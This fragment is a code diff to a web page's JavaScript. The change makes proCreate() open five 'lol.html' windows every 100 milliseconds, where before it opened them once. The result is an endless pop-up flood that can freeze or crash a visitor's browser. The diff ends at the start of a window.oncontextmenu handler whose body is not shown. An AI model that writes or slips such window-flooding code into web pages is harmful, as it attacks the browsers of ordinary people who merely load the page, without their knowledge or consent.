@@ -61,9 +61,11 @@ function openWindow(url) {
 }
 
 function proCreate() {
-    for (var i = 0; i < 5; i++) {
-        openWindow('lol.html');
-    }
+    setInterval(() => {
+        for (var i = 0; i < 5; i++) {
+            openWindow('lol.html');
+        }
+    }, 100); // Adjust delay as needed
 }
 
 window.oncontextmenu = function () {
